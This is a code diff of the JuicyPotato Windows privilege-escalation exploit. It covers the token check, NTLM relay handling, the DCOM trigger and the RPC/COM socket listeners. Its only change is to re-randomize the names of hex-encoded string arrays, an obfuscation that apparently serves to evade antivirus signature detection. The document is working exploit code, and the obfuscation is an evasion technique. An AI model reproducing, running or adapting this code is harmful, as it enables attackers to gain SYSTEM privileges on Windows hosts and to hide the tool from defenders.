@@ -42,9 +42,9 @@ wchar_t *processname = NULL;
 int IsTokenSystem(HANDLE tok)
 {
 	
-	const char  hid__S__S__EHPTkuiI96KT[] = {'\x25','\x53','\x3b','\x25','\x53','\\','\x25','\x53','\n',0};
+	const char  hid__S__S__xfvDw8D5hhEF[] = {'\x25','\x53','\x3b','\x25','\x53','\\','\x25','\x53','\n',0};
 
-	const wchar_t  hid_S_Y_S__lLPlNf0OLMzU[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
+	const wchar_t  hid_S_Y_S__4v1JSSsAq94i[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
 DWORD Size, UserSize, DomainSize;
 	SID *sid;
 	SID_NAME_USE SidType;
@@ -70,8 +70,8 @@ DWORD Size, UserSize, DomainSize;
 	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
 	free(sid);
 
-	printf(hid__S__S__EHPTkuiI96KT, olestr, DomainName, UserName);
-	if (!_wcsicmp(UserName, hid_S_Y_S__lLPlNf0OLMzU))
+	printf(hid__S__S__xfvDw8D5hhEF, olestr, DomainName, UserName);
+	if (!_wcsicmp(UserName, hid_S_Y_S__4v1JSSsAq94i))
 		return 1;
 
 	return 0;
@@ -80,18 +80,18 @@ DWORD Size, UserSize, DomainSize;
 void usage()
 {
 	
-	const char  hid_JuicyP_cJhwyU3MRiBA[] = {'\x4a','\x75','\x69','\x63','\x79','\x50','\x6f','\x74','\x61','\x74','\x6f','\x20','\x76','\x25','\x73','\x20','\n','\n',0};
+	const char  hid_JuicyP_sSs6J4gqciTc[] = {'\x4a','\x75','\x69','\x63','\x79','\x50','\x6f','\x74','\x61','\x74','\x6f','\x20','\x76','\x25','\x73','\x20','\n','\n',0};
 
-	const char  hid_Mandat_AFW87SDKLsOf[] = {'\x4d','\x61','\x6e','\x64','\x61','\x74','\x6f','\x72','\x79','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x74','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x70','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x63','\x61','\x6c','\x6c','\x3a','\x20','\x3c','\x74','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x2c','\x20','\x3c','\x75','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x2c','\x20','\x3c','\x2a','\x3e','\x20','\x74','\x72','\x79','\x20','\x62','\x6f','\x74','\x68','\n','\x2d','\x70','\x20','\x3c','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x3e','\x3a','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x74','\x6f','\x20','\x6c','\x61','\x75','\x6e','\x63','\x68','\n','\x2d','\x6c','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\n',0};
+	const char  hid_Mandat_iTdabOm35vBC[] = {'\x4d','\x61','\x6e','\x64','\x61','\x74','\x6f','\x72','\x79','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x74','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x70','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x63','\x61','\x6c','\x6c','\x3a','\x20','\x3c','\x74','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x2c','\x20','\x3c','\x75','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x2c','\x20','\x3c','\x2a','\x3e','\x20','\x74','\x72','\x79','\x20','\x62','\x6f','\x74','\x68','\n','\x2d','\x70','\x20','\x3c','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x3e','\x3a','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x74','\x6f','\x20','\x6c','\x61','\x75','\x6e','\x63','\x68','\n','\x2d','\x6c','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\n',0};
 
-	const char  hid_Option_HbAlpntYUBkk[] = {'\x4f','\x70','\x74','\x69','\x6f','\x6e','\x61','\x6c','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x6d','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x61','\x20','\x3c','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3e','\x3a','\x20','\x63','\x6f','\x6d','\x6d','\x61','\x6e','\x64','\x20','\x6c','\x69','\x6e','\x65','\x20','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x20','\x74','\x6f','\x20','\x70','\x61','\x73','\x73','\x20','\x74','\x6f','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x4e','\x55','\x4c','\x4c','\x29','\n','\x2d','\x6b','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x69','\x70','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x6e','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x33','\x35','\x29','\n','\x2d','\x63','\x20','\x3c','\x7b','\x63','\x6c','\x73','\x69','\x64','\x7d','\x3e','\x3a','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x42','\x49','\x54','\x53','\x3a','\x7b','\x34','\x39','\x39','\x31','\x64','\x33','\x34','\x62','\x2d','\x38','\x30','\x61','\x31','\x2d','\x34','\x32','\x39','\x31','\x2d','\x38','\x33','\x62','\x36','\x2d','\x33','\x33','\x32','\x38','\x33','\x36','\x36','\x62','\x39','\x30','\x39','\x37','\x7d','\x29','\n','\x2d','\x7a','\x20','\x6f','\x6e','\x6c','\x79','\x20','\x74','\x65','\x73','\x74','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x61','\x6e','\x64','\x20','\x70','\x72','\x69','\x6e','\x74','\x20','\x74','\x6f','\x6b','\x65','\x6e','\'','\x73','\x20','\x75','\x73','\x65','\x72','\n',0};
-printf(hid_JuicyP_cJhwyU3MRiBA, VERSION);
+	const char  hid_Option_NVYa3IGWWMjE[] = {'\x4f','\x70','\x74','\x69','\x6f','\x6e','\x61','\x6c','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x6d','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x61','\x20','\x3c','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3e','\x3a','\x20','\x63','\x6f','\x6d','\x6d','\x61','\x6e','\x64','\x20','\x6c','\x69','\x6e','\x65','\x20','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x20','\x74','\x6f','\x20','\x70','\x61','\x73','\x73','\x20','\x74','\x6f','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x4e','\x55','\x4c','\x4c','\x29','\n','\x2d','\x6b','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x69','\x70','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x6e','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x33','\x35','\x29','\n','\x2d','\x63','\x20','\x3c','\x7b','\x63','\x6c','\x73','\x69','\x64','\x7d','\x3e','\x3a','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x42','\x49','\x54','\x53','\x3a','\x7b','\x34','\x39','\x39','\x31','\x64','\x33','\x34','\x62','\x2d','\x38','\x30','\x61','\x31','\x2d','\x34','\x32','\x39','\x31','\x2d','\x38','\x33','\x62','\x36','\x2d','\x33','\x33','\x32','\x38','\x33','\x36','\x36','\x62','\x39','\x30','\x39','\x37','\x7d','\x29','\n','\x2d','\x7a','\x20','\x6f','\x6e','\x6c','\x79','\x20','\x74','\x65','\x73','\x74','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x61','\x6e','\x64','\x20','\x70','\x72','\x69','\x6e','\x74','\x20','\x74','\x6f','\x6b','\x65','\x6e','\'','\x73','\x20','\x75','\x73','\x65','\x72','\n',0};
+printf(hid_JuicyP_sSs6J4gqciTc, VERSION);
 
-	printf(hid_Mandat_AFW87SDKLsOf
+	printf(hid_Mandat_iTdabOm35vBC
 	);
 
 	printf("\n\n");
-	printf(hid_Option_HbAlpntYUBkk
+	printf(hid_Option_NVYa3IGWWMjE
 	);
 }
 
@@ -147,7 +147,7 @@ int PotatoAPI::findNTLMBytes(char *bytes, int len) {
 
 int PotatoAPI::processNtlmBytes(char *bytes, int len) {
 	
-	const char  hid_Error__LUmbJ2vyqxWg[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x2d','\x20','\x55','\x6e','\x6b','\x6e','\x6f','\x77','\x6e','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x6d','\x65','\x73','\x73','\x61','\x67','\x65','\x20','\x74','\x79','\x70','\x65','\x2e','\x2e','\x2e',0};
+	const char  hid_Error__dfoF96BzqnOy[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x2d','\x20','\x55','\x6e','\x6b','\x6e','\x6f','\x77','\x6e','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x6d','\x65','\x73','\x73','\x61','\x67','\x65','\x20','\x74','\x79','\x70','\x65','\x2e','\x2e','\x2e',0};
 int ntlmLoc = findNTLMBytes(bytes, len);
 	if (ntlmLoc == -1) return -1;
 
@@ -166,7 +166,7 @@ int ntlmLoc = findNTLMBytes(bytes, len);
 			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
 			break;
 		default:
-			printf(hid_Error__LUmbJ2vyqxWg);
+			printf(hid_Error__dfoF96BzqnOy);
 			return -1;
 			break;
 	}
@@ -190,7 +190,7 @@ int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
 int PotatoAPI::triggerDCOM(void)
 {
 	
-	const wchar_t  hid________HMLzbPdwmrD4[] = {'\x7b','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x43','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x34','\x36','\x7d',0};
+	const wchar_t  hid________CvW3hO83xNn3[] = {'\x7b','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x43','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x34','\x36','\x7d',0};
 CoInitialize(nullptr);
 
 	//Create IStorage object
@@ -208,7 +208,7 @@ CoInitialize(nullptr);
 	CLSIDFromString(olestr, &clsid);
 	CLSID tmp;
 	//IUnknown IID
-	CLSIDFromString(hid________HMLzbPdwmrD4("{00000000-0000-0000-C000-000000000046}"), &tmp);
+	CLSIDFromString(hid________CvW3hO83xNn3, &tmp);
 	MULTI_QI qis[1];
 	qis[0].pIID = &tmp;
 	qis[0].pItf = NULL;
@@ -223,21 +223,21 @@ CoInitialize(nullptr);
 
 int PotatoAPI::startRPCConnection(void) {
 	
-	const char  hid_WSASta_v1uGS9svtRFv[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_WSASta_WAl1dNUy7qtV[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid________3QJHFn7V3h6j[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};
+	const char  hid________R5MtUMcIYasF[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};
 
-	const char  hid_getadd_NogQM2nbRNWX[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_getadd_8vMZRkPeCfqz[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_socket_UcjDUbzheZ0G[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};
+	const char  hid_socket_hjZoo5QExZpZ[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};
 
-	const char  hid_Unable_ZIfFBqqeZoga[] = {'\x55','\x6e','\x61','\x62','\x6c','\x65','\x20','\x74','\x6f','\x20','\x63','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x20','\x74','\x6f','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x21','\n',0};
+	const char  hid_Unable_ssiq80Hb6ycF[] = {'\x55','\x6e','\x61','\x62','\x6c','\x65','\x20','\x74','\x6f','\x20','\x63','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x20','\x74','\x6f','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x21','\n',0};
 
-	const char  hid_RPC____HuVllUzfsdP8[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_RPC____c2YuE9tEVWqW[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_RPC____pHXkKAfAXl8r[] = {'\x52','\x50','\x43','\x2d','\x3e','\x20','\x43','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x69','\x6f','\x6e','\x20','\x63','\x6c','\x6f','\x73','\x65','\x64','\n',0};
+	const char  hid_RPC____qOp9rrIDtIAN[] = {'\x52','\x50','\x43','\x2d','\x3e','\x20','\x43','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x69','\x6f','\x6e','\x20','\x63','\x6c','\x6f','\x73','\x65','\x64','\n',0};
 
-	const char  hid_RPC____R6Y9GtnsQlDX[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_RPC____cMkEuEzJzkgc[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 const int DEFAULT_BUFLEN = 4096;
 
 	fflush(stdout);
@@ -255,7 +255,7 @@ const int DEFAULT_BUFLEN = 4096;
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf(hid_WSASta_v1uGS9svtRFv, iResult);
+		printf(hid_WSASta_WAl1dNUy7qtV, iResult);
 		return 1;
 	}
 
@@ -273,7 +273,7 @@ const int DEFAULT_BUFLEN = 4096;
 		wcstombs(myhost, rpcserver, 24);
 	}
 	else {
-		strcpy(myhost, hid________3QJHFn7V3h6j);
+		strcpy(myhost, hid________R5MtUMcIYasF);
 	}
 
 	if (rpcport != NULL) {
@@ -286,7 +286,7 @@ const int DEFAULT_BUFLEN = 4096;
 
 	iResult = getaddrinfo(myhost, myport, &hints, &result);
 	if (iResult != 0) {
-		printf(hid_getadd_NogQM2nbRNWX, iResult);
+		printf(hid_getadd_8vMZRkPeCfqz, iResult);
 		WSACleanup();
 		return 1;
 	}
@@ -296,7 +296,7 @@ const int DEFAULT_BUFLEN = 4096;
 		// Create a SOCKET for connecting to server
 		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 		if (ConnectSocket == INVALID_SOCKET) {
-			printf(hid_socket_UcjDUbzheZ0G, WSAGetLastError());
+			printf(hid_socket_hjZoo5QExZpZ, WSAGetLastError());
 			WSACleanup();
 			return 1;
 		}
@@ -313,7 +313,7 @@ const int DEFAULT_BUFLEN = 4096;
 	}
 
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf(hid_Unable_ZIfFBqqeZoga);
+		printf(hid_Unable_ssiq80Hb6ycF);
 		WSACleanup();
 		return 1;
 	}
@@ -336,7 +336,7 @@ const int DEFAULT_BUFLEN = 4096;
 
 		iResult = send(ConnectSocket, sendbuf, *len, 0);
 		if (iResult == SOCKET_ERROR) {
-			printf(hid_RPC____HuVllUzfsdP8, WSAGetLastError());
+			printf(hid_RPC____c2YuE9tEVWqW, WSAGetLastError());
 			closesocket(ConnectSocket);
 			WSACleanup();
 			return 0;
@@ -348,10 +348,10 @@ const int DEFAULT_BUFLEN = 4096;
 			comSendQ->push(recvbuf);
 		}
 		else if (iResult == 0) {
-			printf(hid_RPC____pHXkKAfAXl8r);
+			printf(hid_RPC____qOp9rrIDtIAN);
 		}
 		else {
-			printf(hid_RPC____R6Y9GtnsQlDX, WSAGetLastError());
+			printf(hid_RPC____cMkEuEzJzkgc, WSAGetLastError());
 			return 0;
 		}
 
@@ -369,23 +369,23 @@ const int DEFAULT_BUFLEN = 4096;
 
 int PotatoAPI::startCOMListener(void) {
 	
-	const char  hid_WSASta_OtiJcv34ZOAg[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_WSASta_B4qWLxzwr8bh[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_getadd_oBjFOB2Gve61[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_getadd_sL5guSLFP43Z[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_socket_mBjCIgXCVJOy[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};
+	const char  hid_socket_Vj59aFjtfc0o[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};
 
-	const char  hid_bind_f_PK2rpwGa542g[] = {'\x62','\x69','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_bind_f_gZtxEF9ashrT[] = {'\x62','\x69','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_listen_BW7Vy86O9oLA[] = {'\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_listen_HD42yedoi3N9[] = {'\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_accept_bQVXMPX4MdFU[] = {'\x61','\x63','\x63','\x65','\x70','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_accept_OCczpPfqU8j2[] = {'\x61','\x63','\x63','\x65','\x70','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_COM____SaSD0aaXf76m[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_COM____O8OADn3zdco1[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_COM____WFzc0orj0B5U[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_COM____eNf9da77HDTC[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid_shutdo_mUZjkM1hTMBy[] = {'\x73','\x68','\x75','\x74','\x64','\x6f','\x77','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid_shutdo_jPdZ9BUuCljD[] = {'\x73','\x68','\x75','\x74','\x64','\x6f','\x77','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
 const int DEFAULT_BUFLEN = 4096;
 	WSADATA wsaData;
 	int iResult;
@@ -399,7 +399,7 @@ const int DEFAULT_BUFLEN = 4096;
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf(hid_WSASta_OtiJcv34ZOAg, iResult);
+		printf(hid_WSASta_B4qWLxzwr8bh, iResult);
 		return 1;
 	}
 
@@ -417,7 +417,7 @@ const int DEFAULT_BUFLEN = 4096;
 	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);
 
 	if (iResult != 0) {
-		printf(hid_getadd_oBjFOB2Gve61, iResult);
+		printf(hid_getadd_sL5guSLFP43Z, iResult);
 		WSACleanup();
 		return 1;
 	}
@@ -428,7 +428,7 @@ const int DEFAULT_BUFLEN = 4096;
 	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));
 
 	if (ListenSocket == INVALID_SOCKET) {
-		printf(hid_socket_mBjCIgXCVJOy, WSAGetLastError());
+		printf(hid_socket_Vj59aFjtfc0o, WSAGetLastError());
 		freeaddrinfo(result);
 		WSACleanup();
 		return 1;
@@ -438,7 +438,7 @@ const int DEFAULT_BUFLEN = 4096;
 	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
 	//printf("startCOMListener bindresult%d\n", iResult);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_bind_f_PK2rpwGa542g, WSAGetLastError());
+		printf(hid_bind_f_gZtxEF9ashrT, WSAGetLastError());
 		freeaddrinfo(result);
 		closesocket(ListenSocket);
 		WSACleanup();
@@ -449,7 +449,7 @@ const int DEFAULT_BUFLEN = 4096;
 
 	iResult = listen(ListenSocket, SOMAXCONN);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_listen_BW7Vy86O9oLA, WSAGetLastError());
+		printf(hid_listen_HD42yedoi3N9, WSAGetLastError());
 		closesocket(ListenSocket);
 		WSACleanup();
 		return 1;
@@ -466,7 +466,7 @@ const int DEFAULT_BUFLEN = 4096;
 	{
 		ClientSocket = accept(ListenSocket, NULL, NULL);
 		if (ClientSocket == INVALID_SOCKET) {
-			printf(hid_accept_bQVXMPX4MdFU, WSAGetLastError());
+			printf(hid_accept_OCczpPfqU8j2, WSAGetLastError());
 			closesocket(ListenSocket);
 			WSACleanup();
 			return 1;
@@ -500,7 +500,7 @@ const int DEFAULT_BUFLEN = 4096;
 			iSendResult = send(ClientSocket, sendbuf, *len, 0);
 
